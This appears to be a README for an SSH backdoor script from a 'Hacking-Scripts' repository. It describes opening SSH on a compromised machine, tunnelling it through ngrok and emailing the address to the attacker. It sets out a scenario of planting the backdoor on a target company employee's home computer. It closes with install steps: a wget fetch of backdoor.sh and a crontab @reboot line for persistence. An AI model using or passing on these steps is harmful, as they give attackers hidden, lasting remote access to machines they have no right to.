### SSH CONNECT BACK 

This is a bash script that gives the attacker `ssh access` to a compromised host in a private network. The script uses a set of linux tools to 
set up an SSH port and uses ngrok for tunneling and the address --that is always randomized is sent to the attackers server, in this 
case the address is sent to our email address.There is a lot of footprint left behind.Please do not use this script for illegal purposes :tada:
 
##### __The following are some of the conditions that should be met for this script to work.__

- [x] The attacker should have physical access to the compromised machine and they should be root or they should have sudo priviledges.
- [x] The script uses `./ngrok` therefore familiarity with [ngrok](https://ngrok.com) is encouraged.
- [x] The compromised machine or host should be connected to an internet connection.
- [x] set up `ssmtp` to send email to our email address -- using gmail in this case :)


##### __The following is a scenarion or use case were the script can be used__

> *Imagine you as the attacker have physical access to a personal computer (of an employee of a target company) that was weakly configured giving us root. This computer is in 
> the home network therefore meaning that it does not face the public internet. You want to constanly get access to this machine, right? Running the script will 
> return an address that will enable you to connect remotely. We can make this fun by running the script as a cron-job or service on boot therefore getting 
> connections wherenever the computer is booted. Amazing or rather dangerous right :)*

**_NB_**: The script uses the `/var/tmp/` directory for its operations and logs errors that are sent back to the attacker.

- The `/etc/ssmtp/ssmtp/.conf` file should be configured since this is where ssmtp checks when sending your email. This is where the sender email 
address and the mail server is with its port is listed.

#### US4GE

1. To download the file you can use `wget` or `curl`. __First run the script to make sure everything is installed ðŸ˜„__
```
wget https://raw.githubusercontent.com/mutur4/Hacking-Scripts/main/post-exploitation/ssh-backdoor/backdoor.sh
chmod +x backdoor.sh
sudo crontab -e 
```
2. Add the following line below the crontab file opened for editing 

`@reboot /usr/bin/sleep 90; /full/path/backdoor.sh`
